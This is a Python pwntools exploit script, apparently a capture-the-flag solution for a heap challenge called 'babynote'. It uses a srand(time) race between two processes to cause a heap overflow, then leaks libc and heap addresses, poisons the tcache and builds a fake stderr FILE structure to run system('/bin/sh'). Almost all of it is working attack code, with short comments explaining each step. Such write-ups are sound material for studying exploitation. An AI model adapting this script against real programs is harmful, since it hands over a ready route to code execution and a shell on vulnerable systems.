#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './babynote')
libc = ELF(exe.libc.path)

def make(size):
   io.sendlineafter(b'>> ', b'1')
   io.sendlineafter(b': ', str(size).encode())

def edit(idx, data):
   io.sendlineafter(b'>> ', b'2')
   io.sendlineafter(b': ', str(idx).encode())
   io.sendlineafter(b': ', data)

def view(idx):
   io.sendlineafter(b'>> ', b'3')
   io.sendlineafter(b': ', str(idx).encode())

def free(idx):
   io.sendlineafter(b'>> ', b'4')
   io.sendlineafter(b': ', str(idx).encode())

"""
race condition via shared file metadata

both connections use same file cause:
- srand(time(NULL)) seeds with unix epoch (seconds)
- if both connect in same second → same seed → same rand() → same filename
- both open /tmp/.nXXXX but have separate memory spaces
"""
io  = process()
io_ = process()

for i in range(7): make(0x40)
free(0)

"""
conn2 starts add, gets idx 0
conn1 completes add with size 0x40 (comes from tcache we just freed)
conn2 completes add with size 0xf0
file now has {size: 0xf0, in_use: 1} at offset 0
conn1 memory has malloc(0x40) at idx 0
when conn1 edits idx 0:
  - sub_1710 reads file → sees size 0xf0
  - updates conn1's notes[0].size = 0xf0
  - sub_1665 writes 0xf0 bytes into 0x40 buffer
  - boom, heap overflow
"""
io_.sendlineafter(b'>> ', b'1')
make(0x40)
io_.sendlineafter(b': ', str(0xf0).encode())

"""
heap overflow exploitation by overwriting the size metadata field
to get overlapping chunks ... which you can exploit using tcache poisoning
"""
for i in range(7): make(0xa0)
for i in range(7, 14): free(i)

make(0xb0)
free(7)

edit(0, p64(0)*9 + p64(0x6b0 | 1))
free(1)

make(0x40)
view(2)

io.recvuntil(b'tent: ')
libc.address = u64(b'\x20' + io.recvline().strip().ljust(7, b'\x00')) - 0x203b20

make(0xe0)
free(7)
view(2)

io.recvuntil(b'tent: ')
heap_base = u64(io.recvline().strip().ljust(8, b'\x00')) << 12

make(0xe0)
make(0xe0)

free(8)
free(7)

edit(2, p64(libc.sym._IO_2_1_stderr_^(heap_base >> 12)))

make(0xe0)
make(0xe0)

"""

_IO_flush_all+227    :   call   QWORD PTR [rax+0x18] -> _IO_wfile_seekoff
_IO_wfile_seekoff+104:   call   __GI__IO_switch_to_wget_mode

pwndbg> disas _IO_switch_to_wget_mode
...SNIP...
   0x00007ffff7c8afc0 <+16>:    mov    rax,QWORD PTR [rdi+0xa0]
...SNIP...
   0x00007ffff7c8afd1 <+33>:    mov    rax,QWORD PTR [rax+0xe0]
   0x00007ffff7c8afdd <+45>:    call   QWORD PTR [rax+0x18]        -> system("/bin/sh")
   
reference: https://z0v3r1n.github.io/blog/openecsc-2025_exitnction
"""
fs  = b"/bin/sh\x00".ljust(8, b'\x00') + p64(0x0)*2
fs += p64(libc.sym.system)
fs  = fs.ljust(0x88, b"\x00") + p64(libc.address + 0x205700)
fs  = fs.ljust(0xa0, b"\x00") + p64(libc.sym._IO_2_1_stderr_-0x20)
fs  = fs.ljust(0xc0, b"\x00") + p64(libc.sym._IO_2_1_stderr_)
fs  = fs.ljust(0xd8, b"\x00") + p64((libc.sym._IO_wfile_jumps+0x48)-0x18)

edit(8, fs)

io.sendlineafter(b'>> ', b'5')
io.interactive()
